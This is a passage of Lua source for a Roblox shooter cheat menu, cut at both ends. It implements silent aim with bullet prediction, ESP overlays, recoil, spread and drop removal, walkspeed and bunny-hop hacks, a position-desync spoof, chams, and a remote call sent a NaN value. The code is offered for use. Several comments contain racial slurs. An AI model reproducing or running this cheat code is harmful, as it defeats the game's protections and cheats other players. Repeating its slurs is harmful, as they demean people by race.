                                    or ((enables.cursor.Radius - 20) - enables.cursor.Gap)
                                )
                            )
                        ),
                }
                y = {
                    pos.Y + (math.sin(angle + (index * (math.pi / 2))) * enables.cursor.Radius),
                    pos.Y
                        + (
                            math.sin(angle + (index * (math.pi / 2)))
                            * (
                                (enables.cursor.Radius - 20)
                                - (
                                    enables.cursor.TheGap
                                        and ((enables.cursor.Radius - 20) / enables.cursor.Gap)
                                    or ((enables.cursor.Radius - 20) - enables.cursor.Gap)
                                )
                            )
                        ),
                }
            end
            --
            line[1].Visible = true
            line[1].Color = enables.cursor.Color
            line[1].From = Vector2.new(x[2], y[2])
            line[1].To = Vector2.new(x[1], y[1])
            line[1].Thickness = enables.cursor.Thickness
            --
            line[2].Visible = enables.cursor.Outline
            line[2].From = Vector2.new(x[2], y[2])
            line[2].To = Vector2.new(x[1], y[1])
            line[2].Thickness = enables.cursor.Thickness + 2.5
        end
    else
        outline.Visible = false
        Ad.Visible = false        --
        for index, line in pairs(lines) do
            line[1].Visible = false
            line[2].Visible = false
        end
    end
    if enables.main.playerinfo and functions:TargetPlayer() then
        -- Advertisement
        Ad.Visible = enables.main.playerinfo
        -- Target
        Target.Text = "Target : "..enables.main.currentname.Name
        Target.Visible = enables.main.playerinfo
        -- Health
        Health.Text = "Health : "..tostring(math.floor(enables.main.currentname.Character.Humanoid.Health)).."/100"
        Health.Visible = enables.main.playerinfo
        -- Distance
        Meters.Text = "Distance : "..math.ceil((camera.CFrame.Position - functions:TargetPlayer().Position).Magnitude / 3.571).."m"
        Meters.Visible = enables.main.playerinfo
        -- Visible
        Visible.Visible = enables.main.playerinfo
        local check = functions:VisibleCheck(enables.main.currentname)
        if check == true then
            Visible.Text = "Visible"
            Visible.Color = Color3.fromRGB(52, 235, 70)
        else
            Visible.Text = "Not Visible"
            Visible.Color = Color3.fromRGB(235, 52, 52)
        end
    else
        Visible.Visible = false
        Ad.Visible = false
        Meters.Visible = false
        Health.Visible = false
        Target.Visible = false
    end
end)

 --// Combat
 local maintab = tabs.combat:createGroup('left', 'Aimbot')
 local maintab1 = tabs.combat:createGroup('left', 'Misc')
 local maintab2 = tabs.combat:createGroup('right', 'Gun Mods')
 local maintab3 = tabs.combat:createGroup('center', 'Misc')

 --// Main aimbot/silentaim
 do -- Whoever got this script he's a nerd fuck that nigga
    maintab:addToggle({text = "silent aim", risky = true, callback = function(Value)
        enables.main.silent = Value
        functions:silentaim()
    end})
    maintab:addToggle({text = "prediction", callback = function(Value)
        enables.main.prediction = Value
    end})
    maintab:addList({text = "hitpart:",multiselect = false,values = {'Head','HumanoidRootPart'}, flag = "hitpart", callback = function(Value)
        enables.main.currenthitpart = Value
    end})
    maintab:addToggle({text = "player info", callback = function(Value)
        enables.main.playerinfo = Value
    end})
    maintab:addToggle({text = "snapline",flags = "snapline", callback = function()end}):addColorpicker({text = 'Color', ontop = true, flag = "snapline_color", color = Color3.new(1,0,0), callback = function()end})
    maintab:addDivider()
    maintab:addLabel({text = "Fov Circle"})
    maintab:addToggle({text = "enable", callback = function(Value)
        Circle.Visible = Value
    end}):addColorpicker({text = 'Color', ontop = true, flag = "circle_color", color = Color3.new(1,1,1), callback = function() Circle.Color = library.flags['circle_color'] end})
    maintab:addToggle({text = "fov filled", callback = function(Value)
        Circle.Filled = Value
    end})
    maintab:addSlider({text = "fov value:", min = 0, max = 500, suffix = "%", flag = "fov_value", float = 1, default = 0, callback = function(Value)
        enables.main.fovradius = Value
    end})
 end

 --// Misc
 do
    maintab1:addToggle({text = "viewmodel", flag = "viewmodel_toggle", callback = function()end})
    maintab1:addSlider({text = "x value:", min = -5, max = 5, suffix = "%", flag = "viewmodel_x", float = 0.1, default = 0, callback = function()end})
    maintab1:addSlider({text = "y value:", min = -5, max = 5, suffix = "%", flag = "viewmodel_y", float = 0.1, default = 0, callback = function()end})
    maintab1:addSlider({text = "z value:", min = -5, max = 5, suffix = "%", flag = "viewmodel_z", float = 0.1, default = 0, callback = function()end})
 end

 --// Misc2
 do
    maintab3:addToggle({text = "mainswitch", flag = "enable_chams", callback = function()end})
    maintab3:addToggle({text = "cloth chams", flag = "arm_chams", callback = function()end}):addColorpicker({text = 'color', ontop = true, flag = "arm_color", color = Color3.new(0,0,0), callback = function()end})
    maintab3:addToggle({text = "gun chams", flag = "gun_chams", callback = function()end}):addColorpicker({text = 'color', ontop = true, flag = "gun_color", color = Color3.new(0,0,0), callback = function()end})
    maintab3:addToggle({text = "arm chams", flag = "cloth_chams", callback = function()end}):addColorpicker({text = 'color', ontop = true, flag = "cloth_color", color = Color3.new(0,0,0), callback = function()end})
    maintab3:addDivider()
    maintab3:addList({text = "cloth material:",multiselect = false,values = {'ForceField', 'Neon', 'SmoothPlastic', 'Glass'}, flag = "arm_material", callback = function()end})
    maintab3:addList({text = "gun material:",multiselect = false,values = {'ForceField', 'Neon', 'SmoothPlastic', 'Glass'}, flag = "gun_material", callback = function()end})
    maintab3:addList({text = "arm material:",multiselect = false,values = {'ForceField', 'Neon', 'SmoothPlastic', 'Glass'}, flag = "cloth_material", callback = function()end})
    maintab3:addDivider()
    maintab3:addLabel({text = "tranparency"})
    maintab3:addSlider({text = "cloth value:", min = 0, max = 1, suffix = "%", flag = "trans_arm", float = 0.1, default = 0, callback = function()end})
    maintab3:addSlider({text = "gun value:", min = 0, max = 1, suffix = "%", flag = "trans_gun", float = 0.1, default = 0, callback = function()end})
    maintab3:addSlider({text = "arm value:", min = 0, max = 1, suffix = "%", flag = "trans_cloth", float = 0.1, default = 0, callback = function()end})
 end
 --// Gun Mods
 do
    maintab2:addToggle({text = "remove drop", callback = function(Value)
        if Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
				if v then
					v:SetAttribute("ProjectileDrop", 2)
				end
			end
		elseif not Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
                if v then
                    local realAmmo = realAmmoTypes:FindFirstChild(v.Name)
                    if realAmmo then
                        v:SetAttribute("ProjectileDrop", realAmmo:GetAttribute("ProjectileDrop"))
                    end
                end
            end
		end
    end})
    maintab2:addToggle({text = "remove recoil", callback = function(Value)
        if Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
				if v then
					v:SetAttribute("RecoilStrength", 0)
				end
			end
		elseif not Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
                if v then
                    local realAmmo = realAmmoTypes:FindFirstChild(v.Name)
                    if realAmmo then
                        v:SetAttribute("RecoilStrength", realAmmo:GetAttribute("RecoilStrength"))
                    end
                end
            end
		end
    end})
    maintab2:addToggle({text = "force tracer", callback = function(Value)
        if Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
				if v then
					v:SetAttribute("Tracer", true)
				end
			end
		elseif not Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
                if v then
                    local realAmmo = realAmmoTypes:FindFirstChild(v.Name)
                    if realAmmo then
                        v:SetAttribute("Tracer", realAmmo:GetAttribute("Tracer"))
                    end
                end
            end
		end
    end})
    maintab2:addToggle({text = "drag", callback = function(Value)
        if Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
				if v then
					v:SetAttribute("Drag", 0)
				end
			end
		elseif not Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
                if v then
                    local realAmmo = realAmmoTypes:FindFirstChild(v.Name)
                    if realAmmo then
                        v:SetAttribute("Drag", realAmmo:GetAttribute("Drag"))
                    end
                end
            end
		end
    end})
    maintab2:addToggle({text = "remove spread", callback = function(Value)
        if Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
				if v then
					if v:GetAttribute("AccuracyDeviation") then
						v:SetAttribute("AccuracyDeviation", 0)
					end
				end
			end
		elseif not Value and replicatestorage:FindFirstChild("AmmoTypes") then
			for i,v in ipairs(replicatestorage.AmmoTypes:GetChildren()) do
                if v then
                    local realAmmo = realAmmoTypes:FindFirstChild(v.Name)
                    if realAmmo then
                        if v:GetAttribute("AccuracyDeviation") then
                            v:SetAttribute("AccuracyDeviation", realAmmo:GetAttribute("AccuracyDeviation"))
                        end
                    end
                end
            end
		end
    end})
 end

 --// Crosshair
 local maintabgroup1 = tabs.combat:createGroup('right', 'Crosshair')
 do
    maintabgroup1:addToggle({text = "Enable", callback = function(first) enables.cursor.Enabled = first end}):addColorpicker({text = "Color", callback = function(x) enables.cursor.Color = x end})
    maintabgroup1:addToggle({text = "From Barrel", callback = function(first) enables.cursor.CustomPos = first end})
    maintabgroup1:addToggle({text = "Outline", callback = function(first) enables.cursor.Outline = first end})
    maintabgroup1:addToggle({text = "Resize", callback = function(first) enables.cursor.Resize = first end})
    maintabgroup1:addToggle({text = "Gap", callback = function(first) enables.cursor.TheGap = first end})
    maintabgroup1:addSlider({text = "Speed",flag = "cursor_speed",default = 3, min = -5, max = 0, suffix="", callback = function(State) enables.cursor.Speed = State end})
    maintabgroup1:addSlider({text = "Radius",flag = "radius_cur", default = 25, min = 0, max = 50, suffix="", callback = function(State) enables.cursor.Radius = State end})
    maintabgroup1:addSlider({text = "Thickness",flag = "thick_ness",default = 2, min = 0, max = 5,suffix ="", callback = function(State) enables.cursor.Thickness  = State end})
    maintabgroup1:addSlider({text = "Gap",flag = "aada",default = 5,min = 0, max = 50, suffix = "", callback = function(State) enables.cursor.Gap = State end})
 end

 --// Visuals aka ESP
 local visualtabgroup = tabs.visuals:createGroup('left', 'Player')  
 do
    visualtabgroup:addToggle({text = "Name", flag = "name_enabled", callback = function() enables.esp.infos.name.enabled = library.flags['name_enabled'] end}):addColorpicker({text = 'Color', ontop = true, flag = "name_color", color = Color3.new(1,1,1), callback = function() enables.esp.infos.name.color = library.flags['name_color'] end})
    visualtabgroup:addToggle({text = "Distance", flag = "distance_enabled", callback = function() enables.esp.infos.distance.enabled = library.flags['distance_enabled'] end}):addColorpicker({text = 'Color', ontop = true, flag = "distance_color", color = Color3.new(1,1,1), callback = function() enables.esp.infos.distance.color = library.flags['distance_color'] end})
    visualtabgroup:addToggle({text = "Weapon", flag = "weapon_enabled", callback = function() enables.esp.infos.weapon.enabled = library.flags['weapon_enabled'] end}):addColorpicker({text = 'Color', ontop = true, flag = "weapon_color", color = Color3.new(1,1,1), callback = function() enables.esp.infos.weapon.color = library.flags['weapon_color'] end})
    visualtabgroup:addToggle({text = "Health text", flag = "healtht_enabled", callback = function() enables.esp.infos.healthtext.enabled = library.flags['healtht_enabled'] end})
    visualtabgroup:addToggle({text = "Health", flag = "health_enabled", callback = function() enables.esp.healthbar = library.flags['health_enabled'] end})
    visualtabgroup:addToggle({text = "Box Chams", flag = "chams_enabled", callback = function() enables.esp.box.gradientbox.enabled = library.flags['chams_enabled'] end})
    visualtabgroup:addLabel({text = "Box Chams Color"})
    visualtabgroup:addColorpicker({text = 'Color1', ontop = true, flag = "boxgradient_color", color = Color3.new(1,1,1), callback = function() enables.esp.box.gradientbox.color1 = library.flags['boxgradient_color'] end})
    visualtabgroup:addColorpicker({text = 'Color2', ontop = true, flag = "boxgradient_color", color = Color3.new(1,1,1), callback = function() enables.esp.box.gradientbox.color2 = library.flags['boxgradient_color'] end})
    visualtabgroup:addToggle({text = "Box", flag = "box_enabled", callback = function() enables.esp.box.boxtype.enabled = library.flags['box_enabled'] end}):addColorpicker({text = 'Color', ontop = true, flag = "box_color", color = Color3.new(1,1,1), callback = function() enables.esp.box.boxtype.color = library.flags['box_color'] end})
    visualtabgroup:addDivider()
    visualtabgroup:addList({text = "Box type:",multiselect = false,values = {'Full','Corner'}, flag = "", callback = function(Value)
        enables.esp.box.boxtype.multiple = Value
    end})
    visualtabgroup:addSlider({text = "Distance Limit", min = 0, max = 10000, suffix = "m", float = 1, default = 5000, flag = "esp_distance",callback = function(Value)
        enables.esp.distancelimit = Value
    end})
 end

 local visualtabgroup2 = tabs.visuals:createGroup('center', 'Bots')

 --// Miscellanous
 local misctabgroup = tabs.misc:createGroup('left', 'World')
 local misctabgroup1 = tabs.misc:createGroup('center', 'Local Player')
 local misctabgroup3 = tabs.misc:createGroup('center', 'Desync Noob')
 local misctabgroup2 = tabs.misc:createGroup('right', 'IDK EXTRA?')

 do
 --// World
    misctabgroup:addToggle({text = "ambient",flags = "ambient", callback = function()
    end}):addColorpicker({text = 'Color', ontop = true, flag = "ambient_color", color = Color3.new(1,0,0), callback = function(Value)
    end})
    misctabgroup:addToggle({text = "remove visor", callback = function(Value)
        while Value do task.wait(0.1)
        local pg = localplayer.PlayerGui
            if pg and pg:FindFirstChild("MainGui") and pg.MainGui:FindFirstChild("MainFrame") and pg.MainGui.MainFrame:FindFirstChild("ScreenEffects") then
                for i,v in ipairs(localplayer.PlayerGui.MainGui.MainFrame.ScreenEffects:GetChildren()) do
                    if v:IsA("Frame") then
                        v.Visible = false
                    end
                end
            end
        end
    end})
    misctabgroup:addToggle({text = "remove grass", callback = function(Value)
        sethiddenproperty(Workspace.Terrain, "Decoration", not Value)
    end})
    misctabgroup:addToggle({text = "remove shadows", callback = function(Value)
        if Value then
            lighting.GlobalShadows = false
        else
            lighting.GlobalShadows = true
        end
    end})
    misctabgroup:addToggle({text = "remove fog", callback = function(Value)
        while Value do task.wait()
            lighting.Atmosphere.Density = 0
            lighting.Atmosphere.Offset = 0
        end
    end})
    misctabgroup:addToggle({text = "remove clouds", callback = function(Value)
        while Value do task.wait()
            game:GetService("Workspace").Terrain.Clouds.Density = 0
        end
    end})
    misctabgroup:addToggle({text = "remove trees/grass", callback = function(Value)
        if Value then
            while Value do task.wait(5)
                if not workspace:FindFirstChild("SpawnerZones") or not workspace.SpawnerZones:FindFirstChild("Foliage") then return end
                if Value == false then continue end
                for i,v in ipairs(workspace.SpawnerZones.Foliage:GetChildren()) do
                    for _,f in ipairs(v:GetChildren()) do
                        for _,s in ipairs(f:GetChildren()) do
                            if s:IsA("MeshPart") and s.Transparency == 0 then
                                if s.Color == Color3.fromRGB(163, 162, 165) then
                                    s.Transparency = 1
                                end
                            end 
                        end
                    end
                end
            end
        elseif not Value then
            if not workspace:FindFirstChild("SpawnerZones") or not workspace.SpawnerZones:FindFirstChild("Foliage") then return end
            for i,v in ipairs(workspace.SpawnerZones.Foliage:GetChildren()) do
                for _,f in ipairs(v:GetChildren()) do
                    for _,s in ipairs(f:GetChildren()) do
                        if s:IsA("MeshPart") then
                            if s.Color == Color3.fromRGB(163, 162, 165) and s.Transparency == 1 then
                                s.Transparency = 0
                            end
                        end 
                    end
                end
            end
        end
    end})
    --[[
    misctabgroup:addToggle({text = "walk on water", callback = function(Value)
        if Value then
            local WaterWalk = workspace:FindFirstChild("WaterWalk") or Instance.new("Folder", workspace); WaterWalk.Name = "WaterWalk"
            local character = localplayer.Character or localplayer.CharacterAdded:Wait()
            local part = character:FindFirstChild("Head")
            local rayparams = RaycastParams.new()
            rayparams.FilterType = Enum.RaycastFilterType.Exclude
        
            rayparams.FilterDescendantsInstances = {character}
        
            if not Value then
                for i,v in pairs(WaterWalk:GetChildren()) do
                    if v then v:Destroy() end
                end
                return
            end
        
            while Value do task.wait(0.1)
                if not Value or not character then continue end
                if camera:FindFirstChild("ViewModel") then
                    rayparams.FilterDescendantsInstances = {character, camera.ViewModel}
                end
                local rayOrigin = part.Position + Vector3.new(0, 150, 0) + camera.CFrame.LookVector * 5
                local rayDirection = Vector3.new(0, -300, 0)
                local rayres = workspace:Raycast(rayOrigin, rayDirection, rayparams)
                if rayres and rayres.Material == Enum.Material.Water then
                    local platform = Instance.new("Part", WaterWalk) platform.Size = Vector3.new(500,1,500); platform.Anchored = true; platform.CanQuery = false; platform.CanTouch = false
                    platform.Position = rayres.Position; platform.Material = Enum.Material.ForceField
                    task.wait(1)
                end
            end
        end
    end})
    ]]
    misctabgroup:addToggle({text = "clocktime",flags = "clocktime", callback = function()
    end})
    misctabgroup:addSlider({text = "clocktime value:", min = 0, max = 24, suffix = "x", flag = "clocktime_value", float = 0.1, default = 0, callback = function(Value)
    end})
    misctabgroup:addList({text = "skybox:",multiselect = false,values = { "Standard", "Among Us", "Doge", "Spongebob", "Deep Space", "Winter", "Clouded Sky" }, flag = "skybox", callback = function(Value)
        value = Value
    end})



    --// Local Player
    misctabgroup1:addToggle({text = "among us :)",risky = true, callback = function(Value)
        game:GetService("ReplicatedStorage").Remotes.UpdateTilt:FireServer(Value and 0/0 or 0)
    end})
    misctabgroup1:addToggle({text = "spin", risky = true, flag = 'spin_toggle', callback = function()end})
    misctabgroup1:addToggle({text = "walkspeed", risky = true, flag = 'walkspeed_toggle', callback = function()
        local hum = localplayer.Character and localplayer.Character:FindFirstChildWhichIsA("Humanoid")
            while library.flags['walkspeed_toggle'] do task.wait()
                local delta = runservice.Heartbeat:Wait()
                if hum.MoveDirection.Magnitude > 0 then
                localplayer.Character:TranslateBy(hum.MoveDirection * library.flags['walkspeed_value'] * delta * 10)
            end
        end
    end})
    misctabgroup1:addToggle({text = "bhop",risky = true, callback = function(Value)
		if Value then
			local function startBunnyHop()
				spawn(function()
					while Value do
						if localplayer.Character and localplayer.Character:FindFirstChildWhichIsA("Humanoid") then
							localplayer.Character.Humanoid:SetAttribute("JumpCooldown", 0)
						end
						task.wait(0.1)
					end
				end)
			end
			startBunnyHop()
		end
    end})
    misctabgroup1:addSlider({text = "spin value:", min = 0, max = 100, suffix = "x", flag = "spin_value", float = 0.1, default = 0, callback = function()end})
    misctabgroup1:addSlider({text = "walkspeed value:", min = 0, max = 2, suffix = "x", flag = "walkspeed_value", float = 0.1, default = 1, callback = function()
    end})
    --// Extra Shit idk
    misctabgroup2:addSlider({text = "fov value:", min = 0, max = 120, suffix = "x", flag = "fov value", float = 0.1, default = 90, callback = function()
        if replicatestorage.Players and replicatestorage.Players:FindFirstChild(localplayer.Name) and replicatestorage.Players:FindFirstChild(localplayer.Name).Settings then
            local settings = replicatestorage.Players:FindFirstChild(localplayer.Name).Settings
            settings.GameplaySettings:SetAttribute("DefaultFOV", library.flags['fov value'])
        end
    end})

    misctabgroup2:addSlider({text = "ads value:", min = 0, max = 30, suffix = "x", flag = "ads_value", float = 0.1, default = 5, callback = function(Value)
    end})
    --// Desync
    misctabgroup3:addToggle({text = "Desync",flags = "desync", callback = function()
    end}):addKeybind({text = "aim bind",type = "toggle",key = Enum.KeyCode.Unknown,flag = "desync_key",callback = function(Value)
        userinput.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Value then
                if enables.misc.desync == false then
                    enables.misc.desync = true
                    danceTrack = localplayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
                    danceTrack.Looped = false
                    danceTrack:Play(.1, 1, 0)
                elseif enables.misc.desync then
                    enables.misc.desync = false
                    danceTrack:Stop()
                    danceTrack:Destroy()
                end
            end
        end)
        userinput.InputEnded:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Value then
                if enables.misc.desync == false then
                    enables.misc.desync = true
                    danceTrack = localplayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
                    danceTrack.Looped = false
                    danceTrack:Play(.1, 1, 0)
                elseif enables.misc.desync then
                    enables.misc.desync = false
                    danceTrack:Stop()
                    danceTrack:Destroy()
                end
            end
        end)
    end})
    misctabgroup3:addSlider({text = "Animation Position", min = -5, max = 5, suffix = "x", flag = "anim_pos", float = 0.1, default = 1.5, callback = function(Value)
    end})
    misctabgroup3:addSlider({text = "Underground Position", min = -5, max = 5, suffix = "x", flag = "under_pos", float = 0.1, default = -2.6, callback = function(Value)
    end})
    

 end

 --// Spin
 local function ToYRotation(_CFrame)
	local _, Y, _ = _CFrame:ToOrientation()
	return CFrame.new(_CFrame.Position) * CFrame.Angles(0, Y, 0)
 end
 local OriginalAutoRotate = localplayer.Character and localplayer.Character:FindFirstChildOfClass("Humanoid") and
 localplayer.Character:FindFirstChildOfClass("Humanoid").AutoRotate or true

 function functions:spin()
    camera = game:GetService("Workspace").CurrentCamera
	
	local SelfCharacter = localplayer.Character
	local SelfRootPart, SelfHumanoid = SelfCharacter and SelfCharacter:FindFirstChild("HumanoidRootPart"),
		SelfCharacter and SelfCharacter:FindFirstChildOfClass("Humanoid")
	if library.flags['spin_toggle'] then
		if SelfCharacter and SelfRootPart and SelfHumanoid then
			SelfHumanoid.AutoRotate = false
			local Angle = -math.atan2(camera.CFrame.LookVector.Z, camera.CFrame.LookVector.X) +
				tick() * library.flags['spin_value'] % 360
			SelfRootPart.CFrame = ToYRotation(CFrame.new(SelfRootPart.Position) * CFrame.Angles(0, Angle, 0))
		end
	else
		if SelfCharacter and SelfRootPart and SelfHumanoid then
			SelfHumanoid.AutoRotate = OriginalAutoRotate
		end
	end
 end

 --// Viewmodel Changer :/
 local function chams_pos(vm) -- pasted but cool idc, supports solara tho.
    if not vm then return end
    if library.flags["viewmodel_toggle"] then
    repeat task.wait() until vm.Name == "ViewModel"
    local HumanoidRootPart = vm:FindFirstChild("HumanoidRootPart")
    local Position = Vector3.new(library.flags["viewmodel_x"], library.flags["viewmodel_y"], library.flags["viewmodel_z"])
    local LeftArm = HumanoidRootPart:FindFirstChild("LeftUpperArm")
    local RightArm = HumanoidRootPart:FindFirstChild("RightUpperArm")
    local Item = HumanoidRootPart:FindFirstChild("ItemRoot")
    if LeftArm and RightArm and Item then
        LeftArm.C0 = LeftArm.C0 + Position
        RightArm.C0 = RightArm.C0 + Position
        Item.C0 = Item.C0 + Position
        end
    end
 end
 camera.ChildAdded:Connect(chams_pos)

 --// Prediction Function
 function functions:MovementPrediction(Origin, Destination, DestinationVelocity, ProjectileSpeed)
    local Distance = (Destination - Origin).Magnitude
    local TimeToHit = (Distance / ProjectileSpeed)
    local Predicted = Destination + DestinationVelocity * TimeToHit
    local Delta = (Predicted - Origin).Magnitude / ProjectileSpeed
    
    ProjectileSpeed = ProjectileSpeed - 0.013 * ProjectileSpeed ^ 2 * TimeToHit ^ 2
    TimeToHit += (Delta / ProjectileSpeed);

    local Actual = Destination + DestinationVelocity * TimeToHit
    return Actual
 end

 --// BulletDrop prediction
 function functions:Trajectory(Origin, Destination, ProjectileSpeed, ProjectileDrop)
    local Distance = (Destination - Origin).Magnitude
    local TimeToHit = (Distance / ProjectileSpeed)
    local ProperSpeed = ProjectileSpeed - 0.013 * ProjectileSpeed ^ 2 * TimeToHit ^ 2
    TimeToHit += (Distance / ProperSpeed)
    
    local DropTime = ProjectileDrop * TimeToHit ^ 2
    if tostring(DropTime):find("nan") or (Distance <= 100) then
        return 0 
    end
    return DropTime;
end

--// Silent aim
function functions:silentaim()
    if functions:TargetPlayer() and enables.main.silent then task.wait()
        if functions:TargetPlayer() and camera:FindFirstChild("ViewModel") then
            local MuzzleReal = nil
            local Status = game.ReplicatedStorage.Players[game.Players.LocalPlayer.Name]:FindFirstChild("Status")
            if Status then
                local EquippedTool = Status.GameplayVariables.EquippedTool.Value
                if EquippedTool then
                    local GunName = game.ReplicatedStorage.Players[game.Players.LocalPlayer.Name].Inventory:FindFirstChild(tostring(EquippedTool))
                    if GunName then
                        local Gun = (GunName.Attachments:FindFirstChild("Magazine") and (GunName.Attachments:FindFirstChild("Magazine")):FindFirstChildOfClass("StringValue") and (((GunName.Attachments:FindFirstChild("Magazine")):FindFirstChildOfClass("StringValue")):FindFirstChild("ItemProperties")).LoadedAmmo) or GunName.ItemProperties:FindFirstChild("LoadedAmmo")
                        if Gun then
                            local IDK = Gun:FindFirstChild("1")
                            if IDK then
                                MuzzleReal = game.ReplicatedStorage.AmmoTypes[IDK:GetAttribute("AmmoType")]:GetAttribute("MuzzleVelocity")
                            end
                        end
                    end
                end
            end
            local Origin = camera.CFrame.p
            local Distination = functions:TargetPlayer().Position
            local Velocity = functions:TargetPlayer().Velocity
            local ViewModel = camera:FindFirstChild("ViewModel")
            local AimPart = ViewModel:FindFirstChild("AimPart")
            local AimPartCanted = ViewModel:FindFirstChild("AimPartCanted")
            local FakeCamera = ViewModel:FindFirstChild("FakeCamera")

            if AimPart and FakeCamera then
                if enables.main.prediction then
                    Distination = functions:MovementPrediction(Origin, Distination, Velocity, MuzzleReal)
                end
                AimPart.CFrame = CFrame.new(Origin, Distination)
            end
        end
    end
 end

 --// Arm & Gun Chams
 local function wrap(f) coroutine.resume(coroutine.create(f)) end
 wrap(function()
    while task.wait(0.1) do
        local View = game:GetService("Workspace").Camera:FindFirstChild("ViewModel")
        if View ~= nil and View and library.flags['enable_chams'] then
            local ItemView = View:FindFirstChild("Item")
            if ItemView and library.flags['gun_chams'] then -- gun
                for _,v in pairs(ItemView:GetDescendants()) do
                    if v.ClassName == "MeshPart" or v.ClassName == "Part" then 
                        if v.Transparency ~= 1 then
                            v.Transparency = (library.flags.trans_gun)
                        end
                        if v.ClassName == "Part" then
                            v.Material  = (library.flags['gun_material'])
                            v.Color     = (library.flags['gun_color'])
                        end
                        if v.ClassName == "MeshPart" then
                            v.Material  = (library.flags['gun_material'])
                            v.Color     = (library.flags['gun_color'])
            
                            if tostring(library.flags['gun_material']) == "ForceField" then
                                v.TextureID = "rbxassetid://9305457875"
                            else
                                v.TextureID = ""
                            end
                        end
                    end
                    if v:FindFirstChildOfClass("SurfaceAppearance") then
                        v.SurfaceAppearance:Destroy()
                        end
                    end
                end
                for _,v in pairs(View:GetChildren()) do
                    if library.flags['arm_chams'] then -- hands
                        if v.ClassName == "Model" or v.Name == "WastelandShirt" or v.Name == "CamoShirt" or v.Name == "CivilianShirt" or v.Name == "GhillieTorso" or v.Name == "GorkaShirt" then
                            if string.find(v.Name, "LL") or string.find(v.Name, "RL") then
                                v.Material = (library.flags['arm_material']) -- hands mat
                                v.Color = (library.flags['arm_color']) -- hands color
                                v.Transparency = library.flags.trans_arm
                                if tostring(library.flags['arm_material']) == "ForceField" then
                                    v.TextureID = "rbxassetid://9305457875"
                                else
                                    v.TextureID = ""
                                end
                    elseif v.ClassName == "Model" and v.Name ~= "Item" then
                        for i, v in pairs(v:GetChildren()) do
                            if v:FindFirstChildOfClass("SurfaceAppearance") then
                                v:FindFirstChildOfClass("SurfaceAppearance"):Destroy()
                            end
                                v.Material = (library.flags['arm_material'])
                                v.Color = (library.flags['arm_color'])
                                v.Transparency = library.flags.trans_arm
                                if tostring(library.flags['arm_material']) == "ForceField" then
                                    v.TextureID = "rbxassetid://9305457875"
                                else
                                    v.TextureID = ""
                                end

                for _,v in pairs(View:GetChildren()) do
                    if library.flags['cloth_chams'] then -- hands
                        if v.ClassName == "MeshPart" then
                            if string.find(v.Name, "Hand") or string.find(v.Name, "Arm") then
                                v.Material = (library.flags['cloth_material']) -- hands mat
                                v.Color = (library.flags['cloth_color']) -- hands color
                                v.Transparency = library.flags.trans_cloth
                                if tostring(library.flags['cloth_material']) == "ForceField" then
                                    v.TextureID = "rbxassetid://9305457875"
                                else
                                    v.TextureID = ""
                                end
                            elseif v.ClassName == "Model" and v.Name ~= "Item" then
                                for i, v in pairs(v:GetChildren()) do
                                    v.Material = (library.flags['cloth_material'])
                                    v.Color = (library.flags['cloth_color'])
                                    v.Transparency = library.flags.trans_cloth
                                    if tostring(library.flags['cloth_material']) == "ForceField" then
                                        v.TextureID = "rbxassetid://9305457875"
                                    else
                                        v.TextureID = ""
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
end
end
end
end)

 --// Loops & Heartbeats
 runservice.Heartbeat:Connect(function()
    --// Skybox
    for i, v in pairs(SkyBoxes[value]) do
        Sky[i] = v
    end
    --// Desync
    temp = temp + 1
    if enables.misc.desync and localplayer.Character and localplayer.Character.HumanoidRootPart then
        danceTrack.TimePosition = library.flags.anim_pos
        dysenc[1] = localplayer.Character.HumanoidRootPart.CFrame
        dysenc[2] = localplayer.Character.HumanoidRootPart.AssemblyLinearVelocity
        local SpoofThis = localplayer.Character.HumanoidRootPart.CFrame
        SpoofThis = SpoofThis + Vector3.new(0,library.flags.under_pos, 0)
        localplayer.Character.HumanoidRootPart.CFrame = SpoofThis
        runservice.RenderStepped:Wait()
        if localplayer.Character and localplayer.Character.HumanoidRootPart then
            localplayer.Character.HumanoidRootPart.CFrame = dysenc[1]
            localplayer.Character.HumanoidRootPart.AssemblyLinearVelocity = dysenc[2]
        end
    end
 end)

 --// Loop to Update!
 runservice.RenderStepped:Connect(function()
    --// Snapline
    if not Snapline then
        Snapline = Drawing.new('Line')
        Snapline.Visible = false
        Snapline.Thickness = 1
    end

    local pos
    if enables.cursor.CustomPos then
        pos = enables.cursor.Position
    else
        pos = Vector2.new(
            game.Players.LocalPlayer:GetMouse().X,
            game.Players.LocalPlayer:GetMouse().Y + game:GetService("GuiService"):GetGuiInset().Y
        )
    end
    local targetCharacter = functions:TargetPlayer()

    if targetCharacter then
        local target = camera:WorldToViewportPoint(targetCharacter.Position)
        Snapline.From = pos
        Snapline.To = Vector2.new(target.X, target.Y)
        Snapline.Color = library.flags.snapline_color
        Snapline.Visible = library.flags.snapline
    else
        Snapline.Visible = false
    end
    --
    --// Ambient LOL EZ
    if library.flags.ambient then
        lighting.Ambient = library.flags.ambient_color
    else
        lighting.Ambient = Color3.new(0, 0, 0)
    end
    --// Nigger timeclock ticking lol ez
    if library.flags.clocktime then
        lighting.ClockTime = library.flags.clocktime_value
    end
    --// ads zoom
